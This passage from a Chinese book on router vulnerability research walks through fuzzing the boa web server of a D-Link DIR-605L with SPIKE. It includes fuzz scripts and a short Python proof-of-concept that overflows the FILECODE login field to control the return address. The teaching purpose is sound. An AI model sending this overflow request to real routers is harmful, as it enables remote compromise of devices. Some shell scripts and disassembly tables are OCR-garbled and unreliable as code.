➢ fuzzable: 启用或禁用变异操作。

name: 默认值为 “None”，用于给 Sulley 句柄指定一个名字。

用法举例如下。

s_byte(1);
s_dword(12345, name="foo", format="ascii");

# 5. 块结构

Sulley 与 SPIKE 相似，可以将多个原语合并成一个块（block）。新的块开始于 s_block_start()，结束于 s_block_end()。每个块必须指定一个名字。其语法定义如下。

s_block_start("newblockname",<group>,<encoder>,<dep>,<dep_value>,<dep_values>,<dep_compare>)；
s_block_end("newblockname");

关于块结构，值得关注的一个特性在于块结构是可以嵌套的，示例如下。

from sulley import *

s_initialize("request1")

if s_block_start("foo") :
    s_static("FOO")
    s_byte(2, format="ascii")
    if s_block_start("bar") :

揭秘家用路由器 0day 漏洞挖掘技术

s_string("123")
s_delim("")
s_string("BAR")
s_block_end("bar")
s_block_end("foo")
req = s_get("request1")
for i in range(req.names["foo"]).num_mutations():
    print s_render()
    s_mutate()

第 2 行～第 11 行：定义了嵌套的块结构。

第 12 行～第 15 行：测试定义的测试数据的结构是否正确，将输出所有的测试用例。运行测试脚本，输出结果如下。

FO02123BAR
FO00123BAR
FO01123BAR
----snip----
FO0253123BAR
FO0254123BAR
FO0255123BAR
FO02BAR
FO02/.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAR
----snip----

Sulley 的功能比 SPIKE 更完善，不仅能够很好地构造模糊测试数据，而且可以监视网络流量、进行错误检测等，是一个非常完整的模糊测试器。不幸的是，Sulley 的错误检测只能运行在 x86 平台上。在路由器模糊测试中，SPIKE 就可以满足要求了。因此，本书就不再介绍更多的高级内容了，对此感兴趣的读者可以参考 Sulley 的官方文档。

#### 17.3.4 Burp Suite

Burp Suite 是用于攻击 Web 应用程序的集成平台，它包含许多工具，并为这些工具设计了许多接口，以加快攻击应用程序的过程。所有的工具都共享一个能处理并显示 HTTP 消息、持久性、认证、代理、日志、警报的强大的和可扩展的框架。

Spider 是 Burp Suite 中的一个应用智能感应网络爬虫，它能完整地枚举应用程序的内容和功能。下面通过使用 Burp Suite 的爬虫抓取 D-Link DIR-645L 路由器传输的连接来认识 Burp Suite。

打开 Burp 套件，配置监听端口，如图 17-4 所示。

 </div>

一旦代理端口选择和服务开始在 Burp 套件运行，我们就需要配置浏览器。以 Chrome 浏览器为例，依次选择“设置”→“显示高级设置”→“更改代理服务器设置”→“局域网设置”→“代理服务器”选项，设置代理服务器的 localhost 和端口 8080（或任何正在运行的端口，默认 Burp 为 8080），然后保存更新的设置，如图 17-5 所示。

 </div>

在浏览器中输入要检查的网站地址，Burp 套件的 “Proxy” 选项卡上会亮起红色标志，表示需要输入内容，默认将拦截设置为 “ON”。由于本例与数据包的内容无关，所以将拦截设置为 “OFF”，如图 17-6 所示。

 </div>

访问路由器的 Web 页面 http://192.168.0.1，可以看到 Burp Suite 已经抓取了多个链接，形成了一棵站点树，如图 17-7 所示。

 </div>

如果需要完整地抓取该路由器上的信息，可以在站点上单击右键，在弹出的快捷菜单中选择“Spider this host”选项，Burp 就会自动探测 D-Link DIR-645 路由器传输的全部页面，如图 17-8 所示。可以看到，Burp 已经抓取了 http://192.168.0.1 上的多个页面，打开“Site map”标

签页中的任意一个页面，即可看到详细的 HTTP 请求信息及路由器 Web 服务器的返回信息。

 </div>

## 17.4 路由器漏洞挖掘实战——D-Link DIR-605L路由器漏洞挖掘

本节给出挖掘 D-Link DIR-605L 路由器漏洞的实战案例。

#### 17.4.1 模糊测试环境描述

测试目标路由器：D-Link DIR-605L（FW_113）。

目标 Web 服务器程序：boa。

➢ 模糊测试工具：SPIKE。

➢ 模糊测试工具的系统环境：Linux Kali 3.7-Trunk-AMD64。

调试器：GDB 7.4.1-Debian。

调试器运行环境：Linux Debian-MIPS 3.2.0-4-4kc-Malta。

➢ 网络数据包捕获：WireShark v1.10.6。

➢ 网络数据包捕获运行环境：Windows 7 SP1 x64。

模糊测试网络拓扑如图 17-9 所示。

揭秘家用路由器 0day 漏洞挖掘技术

 </div>

#### 17.4.2 运行环境搭建

下面介绍如何搭建运行环境。

# 1. 固件分析

首先，我们从 D-Link 官方网站下载固件，下载链接为 ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP，解压缩后得到固件 dir605L_FW_113.bin。

使用 Binwalk 将固件中的文件系统提取出来，如图 17-10 所示。

 </div>

在提取出的根文件系统中搜索目标 Web 服务器程序 boa:/bin/boa，如图 17-11 所示。

 </div>

# 2. 修复boa执行环境

模拟的 MIPS 系统中是不存在路由器的相关工作模块的。本次测试的 D-Link DIR-605L 路由器的 Web 服务器程序 boa 会出现启动失败的情况，这时按照第 3 章介绍的方法修复 boa 执行环境即可。

# 3. Shell脚本

经过修复，boa 就可以在 MIPS 系统中顺利运行了。分别为 boa 的启动和调试器的启动编写脚本，这样运行起来更加方便，不需要每次输入很多难记的命令，代码如下。

源码 7 runboa.sh 运行 boa

#!/bin/sh
status='ps aux | grep "boa" | grep -v grep | head -n 1|sed -e
's/^\[\ ]\\{1,\}\//g' | sed -e 's/[ \t]\{1,\}\/ /g' | cut -d" "-f8 | cut -cl'
echo $status
if ["$status" != ""]; then
  pid='ps aux | grep "boa" | grep -v grep | head -n 1|sed -e
's/^\[\ ]\\{1,\}\//g' | sed -e 's/[ \t]\{1,\}\/ /g' | cut -d" "-f2'
  echo "kill boa!"
  kill -9 $pid
fi
export ID_PRELOAD="/apmib-ld.so"
chroot ./ ./bin/boa

第 2 行：获取 boa 在系统中的运行状态。

第 4 行～第 8 行：如果系统中已经运行了 boa，就先结束 boa 进程。

第 9 行：使用新的动态库 apmib-ld.so 劫持系统调用。

第 10 行：运行 boa。

##### 源码 8 debug.sh 使用 gdb 附加 boa

#!/bin/sh
pid='ps aux |grep "boa" | grep -v grep |head -n 1|sed -e
's/^\[\ ]\{\1,\}\//g' | sed -e 's/[t]\{\1,\}\//g' | cut -d" "-f2
echo "attach to pid "$pid
gdb ./bin/boa $pid

第 2 行：获取 boa 进程号。

第 4 行：使用 GDB 附加 boa 进程。

#### 17.4.3 协议分析

在开始模糊测试之前，需要对目标程序使用的协议有一个初步的认识。目前虽然已经有了一些采用高级算法的智能协议分析理论或者工具，但是其识别效率就见仁见智了。对复杂协议的分析，还是需要人工进行。

当然，智能化的分析工具在很多时候还是可以提供很好的辅助作用的。由于本书测试的是Web服务器，因此需要测试的协议是广泛使用的 HTTP 协议，分析难度就大大降低了。HTTP 协议的相关知识已经在第 1 章详细介绍，这里不再重复。

#### 17.4.4 数据输入点分析

在得知 boa 使用的协议是 HTTP 协议之后，我们开始分析在该协议中有哪些位置可以成为模糊测试的数据输入点，然后在这些数据输入点构造数据展开。根据如下 HTTP 协议，分析本次模糊测试的输入点。

POST /login.cgi HTTP/1.1 (CRLF)
User-Agent:Mozilla/4.0(compatible;MSIE6.0;Windows NT 5.0) (CRLF)
Host:www.baidu.com (CRLF)
Connection:Keep-Alive (CRLF)
(CRLF)
username=admin&passwd=admin

第 1 行：POST 方法是一个输入点，而 URI 部分的 “/login.cgi” 是访问网页时请求超链接的一部分。由于 URI 超长而导致安全漏洞的例子屡见不鲜，因此这里的数据需要进行模糊测试。

第 2 行～第 4 行：列举了两个消息报头。在消息报头（名字: 值）中，对值域可以进行模糊测试，并且要尽可能多地覆盖请求头（如 Accept、Host、Cookie 等）。

第 6 行：请求的正文。Web 服务器在处理这一部分时很容易出问题，所以必须对这里进行模糊测试。

根据上面的分析，我们已经确认了请求头和请求正文中可以进行模糊测试的输入点，现在主要的难点就集中在请求正文的字段，示例如下。

username=admin&passwd=admin

字段“username”和“passwd”仅仅存在于“login.cgi”页面，而每个页面的表单字段都不都是相同的。因此，为了让模糊测试路径覆盖整个 boa，我们需要搜集和整理 Web 服务器支持的每一个页面的请求 URI 及表单字段。这里提供一种思路，如图 17-12 所示，使用 Burp Suite 代理浏览器去访问路由器的每一个页面的每一个功能，让 Burp Suite 遍历所有的页面，这样就可以得到所有页面的 URI 和请求正文了，也可以根据得到的 HTTP 协议内容构造模糊测试数据了。

 </div>

通过上面的分析发现，可以作为模糊测试的输入点如下。

1 [fuzzable] [fuzzable] HTTP/1.1 (CRLF)
2 User-Agent: [fuzzable] (CRLF)
3 Host: [fuzzable] (CRLF)
4 Connection: [fuzzable] (CRLF)

揭秘家用路由器 0day 漏洞挖掘技术

5 Content-Length: [fuzzable] (CRLF)
6 Content-Type: [fuzzable] (CRLF)
7 (CRLF)
8 [fuzzable] = [fuzzable] & [fuzzable] = [fuzzable]

接下来就可以编写 SPIKE 脚本来构造模糊测试数据块了。以 URI /goform/formLogin 为例，编写模糊测试脚本如下。

源码 SPIKE 模糊测试脚本 boa.spk

s_string("POST /goform/formLogin HTTP/1.1\r\n");
s_string("Host: ");
s_string_variable("127.0.0.1");
s_string("\\r\\n");
s_string("User-Agent: ");
s_string_variable("Mozilla/6.0");
s_string("\\r\\n");
s_string("Connection: close\r\n");
s_string("Content-Length: ");
s_blocksize_string("post_args", 7);
s_string("\r\nContent-Type: ");
s_string_variable("application/x-www-form-encoded\r\n\r\n");
s_block_start("post_args");
s_string_variable("FILECODE");
s_string("=");
s_string_variable("ABCD");
s_block_end("post_args");
s_readline();

上面的脚本相当于发送以下 POST 请求。

1 POST /goform/formLogin HTTP/1.1
2 Host: [fuzzhost]
3 User-Agent: [fuzzuser-agent]
4 Connection: close
5 Content-Length: <dynamic-length>
6 Content-Type: [fuzzcontent-type]
7 [fuzzname]=[fuzzvalue]

现在，模糊测试需要的所有环境都已就绪。

#### 17.4.5 HTTP协议模糊测试

在进行正式的模糊测试之前，我们确认一下测试的环境。

模糊测试脚本：boa.spk。

➢ 网络数据包捕获：Wireshark。

目标程序: boa。

目标程序启动脚本：runboa.sh。

调试器脚本：debug.sh。

测试环境准备就绪，下面正式开始对路由器 Web 服务器进行模糊测试。

启动 MIPS 系统。如何使用 QEMU 启动 MIPS 系统并完成网络配置的方法参见第 1 章，这里不再重复。

MIPS 系统启动完毕，使用 SSH 连接，如图 17-13 所示。可以看到，这里已经通过 SSH 将 D-Link DIR-605L 路由器的文件系统 squashfs-root-1 放入 MIPS 系统了。将模糊测试需要的 3 个文件（boa 运行脚本、调试脚本、apmib 劫持库）也一并放入。之所以复制整个目录到 MIPS 系统，是因为 boa 的运行需要依赖配置文件及动态链接库，在此不必把配置文件和链接库从文件系统中挑出。

 </div>

启动 boa 服务器，监听 HTTP 连接，在 MIPS 系统中运行以下脚本。

root@debian-mips:~/squashfs-root-1# ./runboa.sh

boa 服务器运行之后，开始使用调试器附加 boa 进程。在使用 GDB 附加 boa 进程以后，GDB 会暂停 boa 的执行，此时，在 GDB 中使用命令 “continue” 让 boa 进程继续执行，命令如下。

root@debian-mips:~/squashfs-root-1# ./debug.sh
attach to pid 2372
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
----snip----
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
0x77c24b7c in ?? ()
(gdb) continue
Continuing.
warning: GDB can't find the start of the function at 0x77c24b7c

调试器和 boa 服务器都启动后，在运行 SPIKE 进行模糊测试之前，应该监听网络数据包。在何处进行数据包的捕获见仁见智，我们可以选择在执行 SPIKE 测试的 Kali Linux 中捕获数据包，命令如下。

root@kali:~# tcpdump -vv -s 0 -p -w /mnt/boa.cap

当然，我们也可以选择在主机的系统中使用 Wireshark 对 NAT 网关进行数据包的捕获，其效果与在 Kali Linux 中捕获相同。本例选择在主机系统中进行数据包的捕获，如图 17-14 所示。

 </div>

捕获数据包的过程开始以后，将 SPIKE 测试脚本 boa.spk 复制到 Kali Linux 系统用户目录下，如图 17-15 所示。

 </div>

运行如下命令。

root@kali:~# generic send tcp 192.168.230.129 80 boa.spk 0 0

模糊测试正式开始。如图 17-16 所示，已经捕获了很多由 SPIKE 构造的 HTTP 协议并发往 192.168.230.129（运行 boa 服务器的 MIPS 系统）。

 </div>

接下来，我们要做的就是等待。等待 SPIKE 模糊测试结束，或者是 GDB 捕获 boa 异常。等待许久，却发现 boa 服务器崩溃了，GDB 捕获的崩溃信息显示为一个段错误。此时，立即使用 “Ctrl+C” 组合键停止 SPIKE，并停止数据包的捕获。

我们看看调试器中崩溃现场的情况，GDB 打印了如下信息。

Program received signal SIGSEGV, Segmentation fault.
0x3d3d3d3c in ?? ()

运行如下命令查看当前寄存器的状态，如图 17-17 所示。

 </div>

可以看到，当前的执行指针已经被劫持，指向  $ 0x3d3d3d3d $，而  $ 0x3d $ 的 ASCII 表示为 “=”。查看当前的栈帧情况，如图 17-18 所示。在这里我们看到了一串熟悉的字符——“=ABCD”，这与我们用 SPIKE 构造的请求正文 “FILECODE=ABCD” 相似。所以，我们需要验证这串控制执行指针的字符串是不是来自 SPIKE 构造的 HTTP 协议。打开捕获的数据包 boa.pcapng，使用 Wireshark 过滤器规则 “http and http contains ===ABCD” 进行过滤。可以看到，一共出现了 15 条数据，而且这 15 条数据都有一个共同的特点，就是以 “FILECODE” 加上多个 “=” 再加上 “ABCD” 的形式构成的。经过对漏洞现场数据及捕获的数据包进行猜测，可能是 FILECODE 字段的值域超长导致了缓冲区溢出。

 </div>

#### 17.4.6 漏洞重现和验证

前面我们在模糊测试过程中捕获了一个异常。经过分析，该异常很可能是因为缓冲区溢出导致的，那么接下来我们就根据异常数据编写一个验证脚本来检验这个猜测。脚本如下。

源码 模糊测试验证代码 boa_test.py

import sys
import string
import urllib, urllib2, httplib
url = "http://192.168.230.129/goform/formLogin"
headers = {
    }
    pdata = {'FILECODE': 'A'\*200}
    data = urllib.urlencode(pdata)
    req = urllib2.Request(url, data, headers)
    rsp = urllib2.urlopen(req)
    print['+'] send packet ok!

第 4 行：构造 HTTP 请求的地址。请求头可以不修改，因此第 5 行 “headers” 为空。

第 7 行～第 8 行：设置 POST 参数，并使用 urlencode() 函数将 POST 参数格式化为 “FILECODE=AAA…” 的形式。

第 9 行～第 10 行：发起 HTTP 连接。

使用与之前相同的方法重新运行 boa 服务器及调试器，运行 boa_test.py，可以看到 boa 再次崩溃，崩溃现场如图 17-19 所示。

当前执行指针已经被 0x41414141（AAAA）控制。查看当前栈帧情况，可以看到有一大段 “A”，“.msg” 覆盖与之前模糊测试中一样。至此，我们就通过模糊测试完成了一次真正的漏洞挖掘过程，并且通过模糊测试发现了一个可以利用的漏洞。下面我们就来分析一下这个漏洞的一些细节。

使用 IDA 加载 boa 进行反汇编，然后跟踪字符串 “FILECODE”，来到 formLogin 函数中，可以看到如图 17-20 所示的 websGetVal() 函数。

websGetVal() 函数获取指定参数名 “FILECODE” 的值域部分，这里获取的是我们构造的超长 “A”。

在解析参数之后，如果 CAPTCHA 功能可用，程序会在 0x00455FF8 处进入 getAuthCode 函数，如图 17-21 所示。

在该函数中使用 `printf` 将获取的超长 FILECODE 值格式化到堆栈中，如图 17-22 所示。

| | | | | | | | |

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>00455E74 addiu</td><td style='text-align: center; word-wrap: break-word;'>$a2, $s0, (dword_49A654 - 0x4A0000)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455E78 move</td><td style='text-align: center; word-wrap: break-word;'>$a0, $s5</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455E7C la</td><td style='text-align: center; word-wrap: break-word;'>$a1, 0x4A0000</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455E80 la</td><td style='text-align: center; word-wrap: break-word;'>$t9, websGetVar</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455E84 move</td><td style='text-align: center; word-wrap: break-word;'>$s7, $v0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455E8C addiu</td><td style='text-align: center; word-wrap: break-word;'>$a1, (aF1lecode - 0x4A0000) = F1LE-CE</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455E90 lw</td><td style='text-align: center; word-wrap: break-word;'>$gp, 0x29e+save_l_gp ($sp)</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>00455FF0</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455FF0 loc_455FF0:</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455FF0 la $t9, getAuthCode</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455FF4 move $a1, $s1</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455FFC move $a0, $s0</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00456000 lw $gp, @x29@+save_gp($sp)</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00456004 nop</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>00455CE0</td><td style='text-align: center; word-wrap: break-word;'>11</td><td style='text-align: center; word-wrap: break-word;'>$a2, 0x64 # &#x27;d&#x27;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455CE4</td><td style='text-align: center; word-wrap: break-word;'>1w</td><td style='text-align: center; word-wrap: break-word;'>$gp, 0xC0+saved_gp($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455CE8</td><td style='text-align: center; word-wrap: break-word;'>move</td><td style='text-align: center; word-wrap: break-word;'>$a0, $s0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455CEC</td><td style='text-align: center; word-wrap: break-word;'>move</td><td style='text-align: center; word-wrap: break-word;'>$a2, $s1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455CF0</td><td style='text-align: center; word-wrap: break-word;'>1a</td><td style='text-align: center; word-wrap: break-word;'>$a1, 0x4A0000</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455CF4</td><td style='text-align: center; word-wrap: break-word;'>1a</td><td style='text-align: center; word-wrap: break-word;'>$t9, unk_4090A4D0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455CF8</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455D00</td><td style='text-align: center; word-wrap: break-word;'>addiu</td><td style='text-align: center; word-wrap: break-word;'>$a1, (aVarAuthS_msg - 0x4A0000)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455D04</td><td style='text-align: center; word-wrap: break-word;'>1w</td><td style='text-align: center; word-wrap: break-word;'>$gp, 0xC0+saved_gp($sp)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>00455D08</td><td style='text-align: center; word-wrap: break-word;'>move</td><td style='text-align: center; word-wrap: break-word;'>$a0, $s0</td></tr></table>

 </div>

sprintf 执行完毕，堆栈中的返回地址 $RA 已经被覆盖为 0x41414141，如图 17-23 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>1601</td><td colspan="2">Hex View-1</td></tr></table>

 </div>

漏洞的细节到这里就已分析完毕。该漏洞源于没有对用户发送到 /goform/formLogin 的 FILECODE 进行验证，在 websGetVal 函数获取参数值以后没有校验值的长度和内容，而在 getAuthCode 函数使用不安全函数 sprintf 格式化参数 FILECODE 的值时也没有对长度进行校验，造成了栈缓冲区溢出。因此，远程攻击者通过精心构造的 HTTP POST 请求，可以利用此漏洞导致任意代码的执行。

### 反侵权盗版声明

电子工业出版社依法对本作品享有专有出版权。任何未经权利人书面许可，复制、销售或通过信息网络传播本作品的行为；歪曲、篡改、剽窃本作品的行为，均违反《中华人民共和国著作权法》，其行为人应承担相应的民事责任和行政责任，构成犯罪的，将被依法追究刑事责任。

为了维护市场秩序,保护权利人的合法权益,我社将依法查处和打击侵权盗版的单位和个人。欢迎社会各界人士积极举报侵权盗版行为,本社将奖励举报有功人员,并保证举报人的信息不被泄露。

举报电话：(010)88254396；(010)88258888

传真：(010)88254397

E - m a i l: dbqq@phei.com.cn

通信地址：北京市万寿路 173 信箱 电子工业出版社总编办公室

邮编：100036

### 关于本书用纸说明

亲爱的读者朋友：您所拿到的这本书使用的是环保轻型纸！

环保轻型纸在制造过程中添加化学漂白剂较少，颜色更接近于自然状态，具有纸质轻柔、光反射率低、保护读者视力等优点，其成本略高于胶版纸。为给您带来更好的阅读体验并与读者共同支持环保，我们在没有提高图书定价的前提下，使用这种纸张。愿我们共同分享纸质图书的阅读乐趣！

电子工业出版社博文视点

